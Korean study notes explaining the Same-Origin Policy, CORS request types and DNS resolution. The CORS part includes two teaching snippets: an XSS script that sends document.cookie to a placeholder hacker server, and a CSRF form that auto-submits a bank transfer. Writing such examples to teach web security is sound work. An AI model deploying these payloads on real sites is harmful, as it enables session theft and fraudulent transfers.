# CORS와 DNS

### 스터디원들의 개별 정리자료 링크

* 김민섭([DNS](https://www.notion.so/DNS-43777d057706434393f70f4d63dc071b), [CORS](https://www.notion.so/CORS-198c382c255644c79481af9cd4325b60))
* [정회형](https://www.notion.so/CORS-DNS-fe20fd22bca54b39a74df8fb3fd7e9d4) (작성자)
* [김종근](https://github.com/Bellroute/TIL/blob/master/Network/CORS%EC%99%80_DNS.md)

----

## CORS (Cross-Origin Resource Sharing)

### 동일 출처 정책(Same-Origin Policy, SOP)

CORS를 이해하려면 먼저 SOP를 알아야 한다. SOP는 지난 2011년, [RFC 6454](https://tools.ietf.org/html/rfc6454#page-5)에서 처음 등장한 보안 정책으로 말 그대로 “**같은 출처에서만 리소스를 공유할 수 있다**”라는 규칙을 가진 정책이다.

### 왜 동일한 출처에서만 자원 공유를 허용하나?

http는 stateless라는 특징을 갖는다. 동일한 사용자의 요청이라도 매번 새로운 요청인 것처럼 처리한다. 같은 개념으로, 서버 입장에서는 브라우저에서 전송되는 http 메시지에 의존하여 실행되기 때문에 요청이 해커가 심은 악성코드의 요청인지, 진짜 사용자의 요청인지 구분할 수 없다.

동일 출처 정책에 의해 기본적으로 교차 출처간의 행위는 다음과 같이 제한된다.

- 교차 출처 쓰기는 허용. (ex. 링크, 리다이렉트, form 제출)
- 교차 출처 임배드도 허용. (ex. 자바스크립트, CSS, img/iframe/embed 태그 등)
- **교차 출처 읽기는 불허.**

실제 웹이라는 오픈된 환경에서 다른 출처의 자원을 가져와서 사용하는 일은 비일비재한데, 이 정책으로 교차 출처 읽기 자체를 전부 막는다는 것은 말도 안되는 일이기 때문에 몇가지 **예외적인 경우**를 두었고 그 중 하나가 바로 CORS 정책이다.

###CORS 동작 과정

#### 기본적인 과정

1. 클라이언트에서 요청 시, HTTP 요청 헤더에 `Origin`이라는 필드에 요청을 보내는 출처를 담아 보낸다.
2. 서버가 이 요청에 대한 응답을 할 때, 응답 헤더의 Access-Control-Allow-Origin 이라는 값에 리소스 접근이 허용된 출처를 보내준다.
3. 브라우저는 보냈던 요청의 `Origin`과 서버가 보내준 응답의 `Access-Control-Allow-Origin`을 비교하여 응답이 유효한 응답인지 아닌지를 결정

기본적인 흐름은 이렇게 간단하지만, 사실 CORS가 동작하는 방식은 한 가지가 아니라 세 가지의 시나리오에 따라 변경된다.

#### Preflight Request

요청을 한 번에 보내지 않고 예비 요청과 본 요청으로 나누어서 서버로 전송하는 시나리오

[![cors preflight](https://camo.githubusercontent.com/554b0cd38b4d35b5fa83b22a03e955ed99a82a192d3a8956fab7427ae033d34d/68747470733a2f2f6576616e2d6d6f6f6e2e6769746875622e696f2f7374617469632f63383636393932353237353233393139333964633638663866396138363062662f36616636362f636f72732d707265666c696768742e706e67)](https://camo.githubusercontent.com/554b0cd38b4d35b5fa83b22a03e955ed99a82a192d3a8956fab7427ae033d34d/68747470733a2f2f6576616e2d6d6f6f6e2e6769746875622e696f2f7374617469632f63383636393932353237353233393139333964633638663866396138363062662f36616636362f636f72732d707265666c696768742e706e67)

- 예비 요청을 preflight라 부르고, 이 요청에는 OPTIONS 메소드가 사용된다.
- 예비 요청은 본 요청을 보내기 이전에 브라우저 자체에서 이 요청을 보내는 것이 안전한지 확인하기 위함이다.
- 예비 요청에서는 다음과 같은 본 요청에 대한 정보를 헤더에 담아 보낸다.
  - Origin : 요청하는 클라이언트의 출처
  - Access-Control-Request-Headers : 본 요청에 포함될 헤더 정보
  - Access-Control-Request-Method : 본 요청에서 사용할 HTTP 메소드
- 서버는 예비 요청의 응답에 Access-Control-Allow-Origin 헤더를 포함해 보낸다.
  - Access-Control-Allow-Origin에는 서버에서 허용하는 출처가 저장되어 있다.
  - 이 출처와 클라이언트의 출처가 다르면 CORS 에러가 발생하게 된다.

#### Simple Request

예비 요청을 보내지 않고 바로 서버에게 본 요청을 보내는 시나리오. 서버가 이에 대한 응답의 헤더에 `Access-Control-Allow-Origin`과 같은 값을 보내주면 그때 브라우저가 CORS 정책 위반 여부를 검사하는 방식

[![simple request](https://camo.githubusercontent.com/ea609636183a7376aa9ce05020c8ccdfd75b61a2067c25e02b44d36d27f66483/68747470733a2f2f6576616e2d6d6f6f6e2e6769746875622e696f2f7374617469632f64386564363531396533303563383037633638373033326666363132343066382f36616636362f73696d706c652d726571756573742e706e67)](https://camo.githubusercontent.com/ea609636183a7376aa9ce05020c8ccdfd75b61a2067c25e02b44d36d27f66483/68747470733a2f2f6576616e2d6d6f6f6e2e6769746875622e696f2f7374617469632f64386564363531396533303563383037633638373033326666363132343066382f36616636362f73696d706c652d726571756573742e706e67)

다음과 같은 조건에 해당하는 경우에만 예비 요청 없이 본 요청을 바로 보낸다.

1. 요청의 메소드는 `GET`, `HEAD`, `POST` 중 하나여야 한다.
2. `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`, `DPR`, `Downlink`, `Save-Data`, `Viewport-Width`, `Width`를 제외한 헤더를 사용하면 안된다.
3. 만약 `Content-Type`를 사용하는 경우에는 `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`만 허용된다.

#### Credential Request

인증된 요청을 사용하는 시나리오. 이 시나리오는 CORS의 기본적인 방식이라기 보다는 다른 출처 간 통신에서 좀 더 보안을 강화하고 싶을 때 사용하는 방법이다.

- 기본적으로 브라우저가 제공하는 비동기 리소스 요청 API(XMLHttpRequest)나 fetch API는 별도의 옵션 없이 브라우저의 쿠키 정보나 인증 관련 헤더를 요청에 담지 않는다.
- 이때 요청에 인증과 관련된 정보를 담을 수 있게 해주는 옵션이 `credentials` 옵션이다.
  - same-origin(기본값) : 같은 출처 간 요청에만 인증 정보를 담을 수 있음
  - include : 모든 요청에 인증 정보를 담을 수 있다
  - omit : 모든 요청에 인증 정보를 담지 않는다.
- Credential request를 하게 되면(=요청에 인증 정보가 담겨있는 상태에서 다른 출처의 리소스를 요청하게 되면) 브라우저는 CORS 정책 위반 여부를 검사할 때 다음 두 가지를 추가하게 된다.
  1. `Access-Control-Allow-Origin`에는 `*`를 사용할 수 없으며, 명시적인 URL이어야한다.
  2. 응답 헤더에는 반드시 `Access-Control-Allow-Credentials: true`가 존재해야한다.



#### 모바일에서는 CORS 이슈를 어떻게 해결하나?

CORS의 요점은 한 도메인에서 로드된 웹 페이지가 AJAX 요청 또는 다른 도메인의 데이터를 수정하는 HTTP 요청을 만드는 것을 방지하는 것이다. 모바일 환경에서 작동하는 네이티브 앱은 도메인에서 로드된 웹 페이지가 아니기 때문에 CORS 제한이 필요하지 않거나 적용되지 않으며 앱의 HTTP 함수는 OPTIONS 프리 플라이트를 전송하지 않으며 서버는 CORS 이슈 없이 요청을 제공한다. 단, 하이브리드 모바일 앱을 사용하는 경우에는 CORS를 처리해야 한다.

#### 그럼 교차 출처 쓰기는 어떻게 막지?

교차 출처 쓰기가 아무런 대책없이 열려 있으면 **XSS, CSRF 공격**에 노출되어 사용자가 의도하지 않은 행동이 실행되게 된다.

예를 들어 2008년 옥션의 개인정보 유출 사고가 있고... 가장 최근에는 모 웹소설 사이트에서 작가에게 보내는 팬아트에 악성 코드를 숨겨 작가가 확인하면 접속해 있던 작가 계정의 권한으로 [작품 전체를 삭제하도록 만든 사례](https://namu.wiki/w/노벨피아#s-3)가 있었다.

- **XSS(Corss Site Scripting)** : 공격자가 악의적인 스크립트를 신뢰할 수 있는 웹사이트에 삽입하는 방법의 공격.

  - Ex) 해커가 웹사이트에 사용자(브라우저)의 쿠키 정보를 빼오는 javascript 코드를 집어넣음

    ```
    <script>window.location = "http://해커의 웹서버주소/?cookie="+document.cookie</script>
    ```

    - 해커가 삽입한 악의적인 스크립트를 클릭하게 되면 해당 브라우저의 쿠키 정보가 해커의 웹 서버로 전송됨
    - 쿠키, 세션 탈취 우려

- **CSRF(Cross-Site Request Forgeries)** : 웹 어플리케이션의 유저가 의도하지 않은 처리를 웹 어플리케이션에서 실행되는 공격

  - Ex)

    - 사용자가 은행사이트에 로그인한다. ([www.mybank.com](http://www.mybank.com/))
    - 새로운 탭을 눌러서 해커가 만든 웹페이지를 방문한다.([www.해커.com](http://www.xn--ve7b13j.com/))
    - 해커의 웹페이지는 다음과 같이 코드를 넣어서 사용자의 은행 계좌에서 돈을 해커의 계좌로 입금 시키라는 요청을 보낸다.

    ```
    <form action = "은행주소" method = POST>
      <input name = "받는사람" value = "해커 계좌">
      <input name = "금액" value = 1000>
    </form>
    <script>document.forms[0].submit()</script>
    ```

    - 은행 웹서버는 사용자의 브라우저 (chrome)에 저장되어 있는 사용자 인증 정보때문에 정상적인 사용자의 요청이라고 인식

  - 이를 방지하기 위해서 **CSRF 방지 토큰**을 이용한다.

- XSS와 CSRF의 관계는... CSRF 공격을 위한 수단 중 하나가 XSS이나, XSS로 쿠키 탈취 등 다른 공격을 할 수도 있고, XSS를 사용치 않고 이미지 태그에 악성 페이지 주소를 숨겨 CSRF 공격을 행하는 기법도 있다.

#### [참고]

> - https://evan-moon.github.io/2020/05/21/about-cors/
> - [https://velog.io/@sj950902/CORS%EC%99%80-SOP%EC%97%90-%EB%8C%80%ED%95%B4-%EC%95%8C%EC%95%84%EB%B3%B4%EC%9E%90-1%ED%83%84](https://velog.io/@sj950902/CORS와-SOP에-대해-알아보자-1탄)
> - https://developer.mozilla.org/ko/docs/Web/HTTP/CORS

-----

## DNS (Domain Name System)

기본적으로 인터넷에 연결된 모든 컴퓨터는 고유의 IP 주소를 갖는다.

(공유기나 사내망을 통해 연결된 경우 공인 IP 주소는 없을 수 있으나, 어쨌든 사설 IP 주소는 갖고 있다)

당연히 서버와 PC 간에, PC와 PC 간에 등의 관계에서 컴퓨터끼리 통신하려면 서로의 IP를 알고 있어야 한다.

그런데 솔직히 `255.255.255.255` 범위 안에서 숫자료 표기하는 IP는 외우기 힘들다. 그래서 나온 것이 `www.example.com`과 같은 **도메인**인데...

> IP와 도메인을 어떻게 매칭시키지?!?

처음에는 SRI 네트워크 정보 센터 (SRI-NIC)에서 IP 주소와 도메인명을 연결시킨 hosts 파일을 만들어 익명 FTP로 배포하면, 사용자들이 다운받아 자신의 컴퓨터에 적용하는 방식을 사용했다. 자신의 IP 주소를 도메인에 연결시키려면 SRI-NIC로 메일을 보내 신청해야 했다.

(이 hosts 파일을 사용한 도메인 매칭은 오늘날에도 대부분의 운영체제에 그대로 남아 있으며 hosts 파일의 설정이 DNS보다 우선하기 때문에 호스트 파일 변조 같은 공격의 대상이 되기도 한다.)

그런데 인터넷이 점점 커지면서 일개 연구소가 이 작업을 담당하기엔 너무 스케일이 커진지라 이를 자동화할 수 있는 시스템이 설계되었고 이것이 DNS이다.

### 도메인 이름의 체계

인터넷 도메인은 하나의 역트리 구조를 하고 있다.

[![img](https://camo.githubusercontent.com/20ed3746945b4d0733416d1d80612aec8e32890973b0a0dc48135af817e02228/68747470733a2f2f74312e6461756d63646e2e6e65742f6366696c652f746973746f72792f323331364139334635314334363239343043)](https://camo.githubusercontent.com/20ed3746945b4d0733416d1d80612aec8e32890973b0a0dc48135af817e02228/68747470733a2f2f74312e6461756d63646e2e6e65742f6366696c652f746973746f72792f323331364139334635314334363239343043)

- 인터넷 도메인의 체계에서 최상위는 루트 도메인(Root Domain)로서 인터넷 도메인의 시작이 된다.
- 루트 도메인 바로 아래 단계를 1단계 도메인이라 하며, 이를 최상위 도메인이라고 하다. 약어로 TLD(Top Level Domain)
- 최상위 도메인은 국가명을 나타내는 **국가 최상위 도메인**과 일반적으로 사용되는 **일반 최상위 도메인**으로 구분된다.
- 도메인을 구입할 경우 1단계 도메인, 혹은 1단계/2단계 도메인 조합 (ex. `co.kr`) 중에 하나를 선택하고 원하는 도메인명을 지정하여 등록한다. 구입한 도메인 단위보다 더 하위 단계의 도메인 (서브도메인) 의 권리는 전부 등록자에게 있다. (ex. `h2f.kr`를 구입하면 하위의 `nas.h2f.kr` 등을 추가 비용없이 마음대로 등록해 사용할 수 있다 )

### 도메인 질의 과정

**1. 반복적 질의**

1. 로컬 DNS에게 요청을 함 -> 로컬은 해당 정보를 가지고 있지 않다면 루트 DNS 서버에게 요청하는 IP 알고 있냐고 물어봄
2. 루트 DNS는 자기는 모르지만 아마 최상위 DNS 서버(TLD)는 알고 있을 거라고 로컬 DNS에게 알려줌
3. 로컬 DNS는 다시 최상위 DNS 서버에게 질의함 알고 있냐고. -> 자기도 모르는데 책임 DNS 서버는 알고 있을 꺼라고 알려줌
4. 로컬 DNS는 책임 DNS 서버에게 알고 있냐고 물어봄 -> 책임 DNS는 알고 있기 때문에 해당 IP 주소를 알려줌
5. 로컬 DNS는 받아온 정보를 사용자에게 최종적으로 알려주고 자신의 DNS 레코드에 나중에 똑같은 요청에대한 신속한 처리를 위해 저장함

**2. 재귀적 질의**

1. 로컬 DNS에게 요청을 함 -> 로컬은 해당 정보를 가지고 있지 않다면 루트 DNS 서버에게 요청하는 IP 알고 있냐고 물어봄
2. 루트 DNS 서버는 모르기 때문에 최상위 DNS 서버에게 물어봄 알고 있냐고
3. 최상위 DNS 서버도 모르기 때문에 책임 DNS 서버에게 물어봄 알고 있냐고
4. 책임 DNS 서버는 알고 있기 때문에 알려줌. (최상위 DNS에게 다시)
5. 최상위 DNS는 받은 정보를 다시 루트 DNS에게 알려줌
6. 루트 DNS는 로컬 DNS에게 받은 정보를 알려줌
7. 로컬 DNS는 최종적으로 사용자에게 받은 정보를 전달하고 자신의 DNS 레코드에 해당 정보를 추가함.

### DNS와 TCP/UDP

DNS는 기본적으로 UDP 프로토콜을 이용하지만 특수한 상황에서는 TCP를 이용해서 조금 더 안전성을 보장한다.

- DNS 포트 : 기본은 UDP/53, 특수한 상황에서는 TCP/53 사용
- UDP가 사용되는 경우 : 일반적인 DNS 질의 응답
- TCP가 사용되는 경우
  - Zone Transfer : 안정성을 위해 두 개 이상의 DNS 서버를 이용 시, DNS 서버 간 데이터베이스를 복제할 경우 안정성을 위해 사용
  - 메시지 사이즈가 512byte를 넘는 경우 tcp로 재질의하여 응답을 받음



#### [참고]

> - https://webdir.tistory.com/161
> - https://m.blog.naver.com/PostView.nhn?blogId=junhyung17&logNo=220506163514&proxyReferer=https:%2F%2Fwww.google.com%2F
> - https://wogh8732.tistory.com/24

